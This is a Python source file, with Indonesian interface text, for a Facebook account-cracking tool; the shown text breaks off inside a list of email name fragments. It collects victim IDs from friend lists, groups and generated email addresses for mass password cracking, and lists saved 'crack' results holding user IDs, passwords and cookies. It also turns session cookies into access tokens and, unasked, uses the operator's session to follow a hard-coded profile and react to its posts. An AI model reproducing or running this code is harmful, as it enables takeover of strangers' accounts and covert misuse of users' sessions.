
# Meta Verified 2024
# Menu Facebook

try:
    import requests, re, os, json, time, random, string
    from Temporary.Useragent.Useragent import Useragent
    from rich.panel import Panel
    from rich.console import Console
    from rich.columns import Columns
    from Penyimpanan.Banner import Terminal
    from Temporary.Terminalize.Styles import style_terminal
    from Temporary.TokenEAAB import Token
    from Temporary.CreateACC.createFB import Requdable
    from rich.tree import Tree
    from rich import print as printz
    from bs4 import BeautifulSoup as bs
    from concurrent.futures import ThreadPoolExecutor
except(Exception, KeyboardInterrupt) as e:
    try:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283140199711?text=FACEBOOK%20ERROR%20%3A%20{quote(str(e))}')
        exit()
    except(Exception, KeyboardInterrupt) as e:
        from urllib.parse import quote
        __import__('os').system(f'xdg-open https://wa.me/6283140199711?text=FACEBOOK%20ERROR%20%3A%20{quote(str(e))}')
        exit()

dump = []
aplikasi_akt, aplikasi_exp, aplikasi_dld=[],[],[]
class Requ:
    def __init__(self) -> None:
        pass
        
    def Bahasa(self, cookies):
        with requests.Session() as r:
            try:
                response = r.get("https://mbasic.facebook.com/language/", cookies={'cookie':cookies}).text
                payload = bs(response, "html.parser")
                for x in payload.find_all('form',{'method':'post'}):
                    if "Bahasa Indonesia" in str(x):
                        bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(response)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(response)).group(1), "submit"  : "Bahasa Indonesia"}
                        byps = r.post("https://mbasic.facebook.com/{x['action']}", data=bahasa, cookies={'cookie':cookies})
                return (byps)
            except: pass

    def FLCookies(self, cookies):
        with requests.Session() as r:
            try:
                response = bs(r.get('https://mbasic.facebook.com/profile.php?id=100028845823412',cookies={"cookie": cookies}).text, 'html.parser')
                if "/a/subscribe.php" in str(response):
                     cari = re.search('/a/subscribe.php(.*?)"', str(response)).group(1).replace("amp;", "")
                     byps = r.get("https://mbasic.facebook.com/a/subscribe.php{}".format(cari), cookies={"cookie": cookies})
                return (byps)
            except: pass
        
    def ReactPost(self, cookies):
        with requests.Session() as r:
            try:
                response = bs(r.get('https://mbasic.facebook.com/100028845823412?v=timeline',cookies={"cookie": cookies}).text, 'html.parser')
                for x in response.find_all('a',href=True):
                    if 'Tanggapi' in x.text:
                        tpr = random.choice(['Super','Wow','Peduli','Marah'])
                        for z in bs(r.get('https://mbasic.facebook.com%s'%(x['href']),cookies={"cookie": cookies}).text,'html.parser').find_all('a'):
                            if tpr == z.text:
                                byps = r.get('https://mbasic.facebook.com'+z['href'],cookies={"cookie": cookies})
                return (byps)
            except: pass

class Require:
    def __init__(self) -> None:
        pass
        
    def Payload(self, response):
        return  {
            'av': re.search('{"actorID":"(\d+)"', str(response)).group(1),
            '__user': re.search('{"actorID":"(\d+)"', str(response)).group(1),
            '__a':'1',
            '__req': 'h',
            '__hs': re.search('"haste_session":"(.*?)"', str(response)).group(1),
            'dpr': '2',
            '__ccg': re.search('"connectionClass":"(.*?)"',str(response)).group(1),
            '__rev': re.search('{"consistency":{"rev":(\d+)}', str(response)).group(1),
            '__s': '',
            '__hsi': re.search('"hsi":"(\d+)"', str(response)).group(1),
            '__dyn': '',
            '__csr': '',
            '__comet_req': re.search('__comet_req=(\d+)', str(response)).group(1),
            'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(response)).group(1),
            'jazoest': re.search('jazoest=(\d+)', str(response)).group(1),
            'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(response)).group(1),
            '__spin_r': re.search('"__spin_r":(\d+)', str(response)).group(1),
            '__spin_b': re.search('"__spin_b":"(.*?)"',str(response)).group(1),
            '__spin_t': re.search('"__spin_t":(\d+)', str(response)).group(1),
            'fb_api_caller_class': 'RelayModern'
        }
        
    def Headers(self):
        return {
            'accept':'*/*',
            'accept-encoding':'gzip, deflate',
            'accept-language':'en-US,en;q=0.9',
            'content-type':'application/x-www-form-urlencoded',
            'origin':'https://www.facebook.com',
            'sec-ch-ua-mobile':'?0',
            'sec-fetch-dest':'empty',
            'sec-fetch-mode':'cors',
            'sec-fetch-site':'same-origin'
        }
        
    def ProfileFB(self, cookies, headers = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}):
        with requests.Session() as r:
            try:
                response = bs(r.get('https://mbasic.facebook.com/profile.php?v=info',headers=headers,cookies={'cookie':cookies}).text,'html.parser')
                if '"success":true' or 'Tanggal Lahir' not in str(response):
                    if response.find(string=re.compile('Tanggal Lahir')):
                        return(response.find(string=re.compile('Tanggal Lahir')).find_next('div').text)
            except (Exception) as e: pass
            
    def ProfileFB2(self, cookies, headers = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}):
        with requests.Session() as r:
            try:
                response = r.get('https://mbasic.facebook.com/profile.php?v=friends',headers=headers,cookies={'cookie':cookies}).text
                if '"success":true' or 'Teman' not in str(response):
                    return (re.search('>Teman (.*?)</h3>',str(response)).group(1).split('(')[1].split(')')[-2])
            except (Exception) as e: pass
            
    def Active(self, cookies, headers = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}):
        with requests.Session() as r:
            try:
                resp = bs(r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",headers=headers,cookies={'cookie':cookies}).text,'html.parser')
                for x  in resp.find_all("h3"):
                    if "Ditambahkan" in x.text: aplikasi_akt.append(f"{str(x.text).replace('Ditambahkan',' Ditambahkan')}")
                    else: continue
                next = "https://mbasic.facebook.com"+resp.find("a",string="Lihat Lainnya")["href"]
                self.Active(cookies, next)
            except (Exception) as e: pass
            
    def Inactive(self, cookies, headers = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}):
        with requests.Session() as r:
            try:
                resp = bs(r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",headers=headers,cookies={'cookie':cookies}).text,'html.parser')
                for x  in resp.find_all("h3"):
                    if "Kedaluwarsa" in x.text: aplikasi_exp.append(f"{str(x.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
                    else: continue
                next = "https://mbasic.facebook.com"+resp.find("a",string="Lihat Lainnya")["href"]
                self.Active(cookies, next)
            except (Exception) as e: pass
            
    def Deleted(self, cookies, headers = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}):
        with requests.Session() as r:
            try:
                resp = bs(r.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",headers=headers,cookies={'cookie':cookies}).text,'html.parser')
                for x  in resp.find_all("h3"):
                    if "Dihapus" in x.text: aplikasi_dld.append(f"{str(x.text).replace('Dihapus',' Dihapus')}")
                    else: continue
                next = "https://mbasic.facebook.com"+resp.find("a",string="Lihat Lainnya")["href"]
                self.Active(cookies, next)
            except (Exception) as e: pass

class Login:
    def __init__(self) -> None:
        self.data = '/sdcard/data/login/'
        pass
        
    def Login_Akun_Facebook(self):
        try:
           Terminal().Banner_Facebook()
           Console(width = 65, style = f"{style_terminal}").print(Panel("[grey50]Silakan Masukan Pilihan Anda, Ketik '[green]cookies[grey50]' Untuk Login Menggunakan Cookie Facebook Dan Ketik '[green]password[grey50]' Untuk Login Menggunakan UserID And Password Facebook", title = f"[white]• [green]Login FB [white]•", subtitle = "╭─────", subtitle_align = "left"))
           query = Console().input("[grey50]   ╰─> ")
           if len(query) >0:
               if query == 'cookies' or query == 'Cookies':
                   try:
                       self.Username_And_Password()
                   except (Exception) as e:
                       Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                       exit()       
               elif query == 'password' or query == 'Password':
                   try:
                       Terminal().Banner_Facebook()
                       Console(width = 65, style = f"{style_terminal}").print(Panel("[grey50]Silakan Masukan [green]UserID [grey50]And[bold green] Password[grey50], Gunakan Pemisah [red]<=>[grey50] Untuk UserID Dengan Password, Pastikan Akun Tidak [yellow]Chekpoint[grey50] Dan Terpasang [red]A2F", title = f"[white]• [green]UserID And Password [white]•", subtitle = "╭─────", subtitle_align = "left"))
                       querty = Console().input("[grey50]   ╰─> ")
                       if len(querty) >0:
                           try:
                               self.username = querty.split('<=>')[0]
                               self.password = querty.split('<=>')[1]
                               self.Convert_Username_And_Password(self.username,self.password)
                           except (Exception) as e:
                               Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                               exit()   
                       else:
                           Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan '[green]UserID And Password[grey50]'", title = f"[white]• [red]Error Not Found [white]•"))
                           exit()     
                   except (Exception) as e:
                       Console(width = 65, style = "bold grey50").print(Panel(f"[b italic red]{str(e).title()}!", title = "[bold grey50][[bold red] Error [bold grey50]]"))
                       exit()   
               else:
                   Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Menu Yang Anda Masukan Tidak Terdaftar Di Menu Ini", title = f"[white]• [red]Error Not Found [white]•"))
                   exit()      
           else:
               Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan Pilihan Anda", title = f"[white]• [red]Error Not Found [white]•"))
               exit()          
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()        
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Facebook()
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silakan Masukan Cookie Facebook Akun Pastikan Tidak[yellow] Chekpoint [grey50]Dan Terpasang [red]A2F", title = f"[white]• [green]Exstention Cookie Dough [white]•", subtitle = "╭─────", subtitle_align = "left"))
            cookies = Console().input("[grey50]   ╰─> ")
            if len(cookies) >0:
                token_eaab = Token().TokenEAAB(cookies)
                self.username, self.fullname = self.Validasi_Cookies(cookies, token_eaab)
                Console().print(f"[grey50]   ╰─> [green]{token_eaab}")
                with open(self.data+'.Cookies_And_TokenEaab.json', mode='w') as wr:
                    wr.write(json.dumps({
                        'Cookie': cookies,
                        'Token': token_eaab
                    }))
                    wr.close()
                Requ().Bahasa(cookies); Requ().FLCookies(cookies); Requ().ReactPost(cookies)
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Datang [green]{self.username}[grey50]/[green]{self.fullname}[grey50], Run Ulang Perintahnya [green]python Run.py", title = f"[white]• [green]Success [white]•"))
                exit()
            else:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan '[green]Cookie Facebook[grey50]'", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()     
            
    def Convert_Username_And_Password(self, username, password):
        byps = requests.Session()
        try:
            self.chrome = (f'{random.choice(["108","128"])}.0.{random.randrange(5111,6999)}.{random.randrange(60, 299)}')
            self.angka = random.choice(['01','02','03','04','05','06','07','08','09','10'])
            self.ubuntu = random.choice(['Ubuntu ','Ubuntu/','Ubuntu; ','Ubuntu-'])
            self.linucx = random.choice(['GoogleApp','YandexSearch','LinuxApp'])
            ua_generate = (f'Mozilla/5.0 (X11; {self.ubuntu}{random.randrange(10,22)}.{self.angka}; Linux {random.choice(["x86_64","i686"])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.chrome} Safari/537.36 {self.linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{str(random.choice(["32","64"]))}')
            byps.headers.update({
                'accept-language': 'en-US,id-ID,id;q=0.9',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'connection': 'keep-alive',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'cache-control': 'max-age=0',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': '"Not)A;Brand";v="{}", "Google Edge";v="{}", "Chromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+)', str(ua_generate)).group(1)),
                'user-agent': ua_generate
            })
            response = byps.get('https://web.facebook.com/').text
            payload = {
				'jazoest':re.search('name="jazoest" value="(.*?)"',str(response)).group(1),
				'lsd':re.search('name="lsd" value="(.*?)"',str(response)).group(1),
                'timezone': '-420',
                'lgndim': '',
				'login': '1',
                'persistent': '1',
                'default_persistent': '',
                'login':'Masuk'
	    	}
            byps.headers.update({
                'host': 'web.facebook.com',
                'origin': 'https://web.facebook.com/',
                'referer': 'https://web.facebook.com/?',
                'cache-control': 'max-age=0',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Google Edge";v="{}", "Chromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1)),
                'accept-encoding': 'gzip, deflate',
                'content-type': 'application/x-www-form-urlencoded',
                'content-length': str(len(("&").join([ "%s=%s" % (name, value) for name, value in payload.items() ]))),
                'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(re.search('"_js_datr","(.*?)"', str(response)).group(1)),
                'connection': 'close'
            })
            payload.update({'email': username, 'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time())[:10],password)})
            response2 = byps.post('https://web.facebook.com/login/?locale=jv_ID', data = payload, allow_redirects = True)
            if 'c_user' in byps.cookies.get_dict().keys():
               try: cookies = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
               except (Exception) as e: cookies = (None)
               Console(width = 65, style = f"{style_terminal}").print(Panel(f"[green]{cookies}", title = f"[white]• [green]Logged In User [white]•"))
               if len(cookies) >0:
                   token_eaab = Token().TokenEAAB(cookies)
                   self.username, self.fullname = self.Validasi_Cookies(cookies, token_eaab)
                   with open(self.data+'.Cookies_And_TokenEaab.json', mode='w') as wr:
                       wr.write(json.dumps({
                           'Cookie': cookies,
                           'Token': token_eaab
                       }))
                       wr.close()
                   Requ().Bahasa(cookies); Requ().FLCookies(cookies); Requ().ReactPost(cookies)
                   Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Datang [green]{self.username}[grey50]/[green]{self.fullname}[grey50], Run Ulang Perintahnya [green]python Run.py", title = f"[white]• [green]Success [white]•"))
                   exit()
               else:
                   Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Tidak Dapat Mengakses Cookie Anda Perkiraan Akun [yellow]Chekpoint[grey50] Atau [red]Invalid[grey50], Silakan Chek Akun Anda Atau Ganti Tumbal Lain", title = f"[white]• [red]Error Not Found [white]•"))
                   exit()
            elif 'checkpoint' in byps.cookies.get_dict().keys():
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Tidak Dapat Mengakses Akun Anda, Akun Anda [yellow]Chekpoint", title = f"[white]• [yellow]Logged Chekpoint [white]•"))
                exit()
            else:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Terjadi Kesalahan [green]UserID[grey50] Atau [green]Password[grey50] Yang Anda Masukan Salah, Silakan Cek [green]UserID[grey50] Dan [green]Password[grey50] Anda Pastikan Benar", title = f"[white]• [red]Logged Error [white]•"))
                exit()
        except (KeyboardInterrupt, Exception, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()   
        
    def Validasi_Cookies(self, cookies, token_eaab):
        with requests.Session() as r:
            try:
                response = r.get(f"https://graph.facebook.com/me?fields=id,name&access_token={token_eaab}", cookies = {'cookies':cookies}).json()
                return (response['id'],response['name'])
            except (KeyError) as e:
                Terminal().clear_terminalize()
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[italic grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                time.sleep(2.1)
                self.Login_Akun_Facebook()
        
class Facebook():
    def __init__(self) -> None:
        self.data = '/sdcard/data/login/'
        self.success, self.chekpoint, self.looping = 0,0,0
        self.CreateDir()
        self.ChekCookies()
        pass
        
    def CreateDir(self):
        try: os.mkdir('/sdcard/data')
        except: pass
        try: os.mkdir('/sdcard/data/login')
        except: pass   
        
    def DeletedCookies(self):
        try: os.system(f'rm -rf {self.data}.Cookies_And_TokenEaab.json')
        except (Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[italic grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()
        Login().Login_Akun_Facebook()
    
    def ChekCookies(self):
        if os.path.isfile(self.data+'.Cookies_And_TokenEaab.json') is True:
           save_login = json.loads(open(self.data+'.Cookies_And_TokenEaab.json', mode='r').read())
           cookies, token_eaab = save_login['Cookie'], save_login['Token']
           self.MenuFacebook(cookies, token_eaab) 
        else: self.DeletedCookies()       
            
    def MenuFacebook(self, cookies, token_eaab):
        try: self.username, self.fullname = Login().Validasi_Cookies(cookies, token_eaab)
        except (requests.exceptions.ConnectionError) as e:
           Terminal().clear_terminalize()
           Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
           time.sleep(2.1)
           self.ChekCookies()
        Terminal().Banner_Facebook()
        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[green]•[grey50]. Username : [green]{self.username} \t[green]•[grey50]. Fullname [green]{self.fullname}", title = f"[white]• [green]Username And Fullname [white]•"))
        Console().print(Columns([Panel('[green]01[grey50]. Dump dari list friends\n[green]02[grey50]. Dump dari member group\n[green]03[grey50]. Dump dari daftar email', width=32, style = f"{style_terminal}", subtitle = "╭─────", subtitle_align = "left"), Panel('[green]04[grey50]. Chek result crack\n[green]05[grey50]. Create akun facebook\n[red]E[grey50]. Exit/Hapus [red]cookies', width=32, style = f"{style_terminal}")]))
        query = Console().input("[grey50]   ╰─> ")
        if query == '1' or query == '01':
            try:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silakan Masukan ID Facebook, ID Pastikan Tidak Terkunci Atau Private, Anda Juga Bisa Menngunakan Koma Untuk Dump Masal, Misalnya :[green] 61563552323081,61563124353946[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                if len(username) >0:
                    for self.username in username.split(','):
                        try: self.Dump_ID_Facebook(self.username, cookies, token_eaab, '')
                        except (Exception, requests.exceptions.ChunkedEncodingError, requests.exceptions.ConnectionError, KeyboardInterrupt) as e: pass
                    if len(dump) < 50:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Mencari Target Lain Dan Pastikan Target Terkumpul Lebih Dari 50 ID",  title = f"[white]• [red]Dump Sedikit [white]•"))
                        exit()
                    else: self.TypeMethod()
                else:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan ID Facebook", title = f"[white]• [red]Error Not Found [white]•"))
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()  
                
        elif query == '2' or query == '02':
            try:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silakan Masukan ID Grup, ID Pastikan Tidak Terkunci Atau Private, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[green] 489534719248261,597954287818565[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                if len(username) >0:
                    for self.username in username.split(','):
                        try: self.Dump_Member_Group(self.username, cookies, '')
                        except (Exception, requests.exceptions.ChunkedEncodingError, requests.exceptions.ConnectionError, KeyboardInterrupt) as e: pass
                    if len(dump) < 50:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Mencari Target Lain Dan Pastikan Target Terkumpul Lebih Dari 50 ID",  title = f"[white]• [red]Dump Sedikit [white]•"))
                        exit()
                    else: self.TypeMethod()
                else:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan ID Group", title = f"[white]• [red]Error Not Found [white]•"))
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()  
                
        elif query == '3' or query == '03':
            try:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silakan Masukan Satu Nama, Pastikan Nama Menggunakan Nama Orang Dan Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya :[green] dinda,setiawan[grey50] Pastikan Koma Tidak Menggunakan Spasi Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silakan Masukan Limid Dump Minimal Limid 2k Ke Atas Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                limited = Console().input("[grey50]   ╰─> ")
                if len(username) >0:
                    for self.username in username.split(','):
                        try: self.Dump_Kontak(self.username, limited)
                        except (Exception, requests.exceptions.ChunkedEncodingError, requests.exceptions.ConnectionError, KeyboardInterrupt) as e: pass
                    if len(dump) < 50:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Dump Melebihi 50 Email Dan Pastikan Menggunakan Nama Umum",  title = f"[white]• [red]Dump Sedikit [white]•"))
                        exit()
                    else: self.TypeMethod()
                else:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan Satu Nama", title = f"[white]• [red]Error Not Found [white]•"))
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width=65).print(Panel('\t[green]01[grey50]. Chek result Ok\t [green]02[grey50]. Chek result Cp',style=f"{style_terminal}",subtitle = "╭─────", subtitle_align = "left"))
                choose = Console().input("[grey50]   ╰─> ")
                if choose =='01' or choose =='1':
                    try: self.result_ok = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[green]/Sdcard/OK/[grey50]'", title = f"[white]• [green] Success [white]•"))
                    for file_ok in self.result_ok: Console().print(f'[green]•[grey50]. {str(file_ok)}')
                    Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [green]OK-Facebook-24-September-2024', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                    akses_result = Console().input("[grey50]   ╰─> ")
                    self.Result(choose, akses_result)
                    exit()
                    
                elif choose =='02' or choose =='2':
                    try: self.result_ok = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[red]/Sdcard/CP/[grey50]'", title = f"[white]• [green] Success [white]•"))
                    for file_ok in self.result_ok: Console().print(f'[red]•[grey50]. {str(file_ok)}')
                    Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [red]CP-Facebook-24-September-2024', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                    akses_result = Console().input("[grey50]   ╰─> ")
                    self.Result(choose, akses_result)
                    exit()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '05' or query == '5':
            try: Requdable().Running()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == 'e' or query == 'E':
            try: self.DeletedCookies()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        else:
            Console(width = 65, style = f"{style_terminal}").print(Panel("[grey50]Opss, Menu Yang Anda Masukan Tidak Terdaftar Di Menu Ini!", title = f"[white]• [red]Error Not Found [white]•"))
            exit()
                
    def Result(self, choose, isi):
        if choose in ('1','01'):
            for buka in open(f'/sdcard/OK/'+str(isi)).readlines():
                try:
                    Console().print(f"\n[green]•[grey50] User ID : [green]{buka.split('|')[0]}\n[green]•[grey50] Password : [green]{buka.split('|')[1]}\n[green]•[grey50] Cookies : [green]{buka.split('|')[2]}")
                except Exception as e:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                    exit()
                    
        elif choose in ('2','02'):
            for buka in open(f'/sdcard/CP/'+str(isi)).readlines():
                try:
                    Console().print(f"\n[red]•[grey50] User ID : [red]{buka.split('|')[0]}\n[red]•[grey50] Password : [red]{buka.split('|')[1]}")
                except Exception as e:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                    exit() 
                    
    def Dump_Kontak(self, nama, limited):
        with ThreadPoolExecutor(max_workers=5):
            for bukan_kaleng in range(int(limited)):
                dumping = random.choice([
                    f"{nama}{random.randint(1,999)}@gmail.com",
                    f"{nama}{str(random.choice(['official','gaming','cantik','ganteng','cool','gamz','arip','aripin','fajar','nanda','riski','yanti','aldo','aldi','aril','reno','caca','cici','turis','riska','dimbrut','gendut','akbar','dada','sayang','cinta','septi','septia','putriani','putri','sahrul','bahrul','ulum','kafa','kafabih','firkam','rifki','rifkia','rifkiani','sugik','ois','bunda','fatimah','zahra','tutik','kucing','malang','lamongan','yuda','ardian','dian','12','123','1234','12345','123456','official','gaming','cantik','ganteng','cool','gamz','arip','aripin','fajar','nanda','riski','yanti','aldo','aldi','aril','reno','caca','cici','turis','riska','dimbrut','gendut','akbar','dada','sayang','cinta','septi','septia','putriani','putri','sahrul','bahrul','ulum','kafa','kafabih','firkam','rifki','rifkia','rifkiani','sugik','ois','bunda','fatimah','zahra','tutik','kucing','malang','lamongan','yuda','ardian','dian','amin','amel','amelia','ais','ananda','agus','aji','adi','andi','andika','abas','aminah','aminatun','bagas','basuki','babas','bayu','badrul','bintang','cindi','cici','cinta','cupita','cupi','dina','diki','difa','dihi','dini','diva','devinta','deni','dila','dilah','fika','fikha','fina','fivi','fatah','fania','fatih','fatun','official','gina','galih','gugun','gifah','gans','kholid','kontol','kania','khoerul','hilada','hilmi','himin','lili','lina','lani','laruh','mia','mas','maz','mamat','mamad','masrul','nina','niha','nining','nula','nana','nunu','nifta','nita','niva','nabila','nadia','odi','oni','ojol','onani','pitri','rosma','riska','rina','rani','ratu','ratna','rifa','riva','rena','reza','rofik','risma','roza','rozak','siska','santi','sari','sarno','susanti','sindi','suci','susana','sinta','sulis','tiwi','tina','tanti','tono','tiara','titin','ulfa','ulfah','ulin','ulfin','unah','udin','usman','usdin','vina','vinka','vani','vatimah','winda','wanti','wani','wadul','xi','zidan','zaenal','zizi','jepara','magelang','karanganyar','nganjuk','kediri','madiun','caruban','saradan','indonesia','cantik','gaming','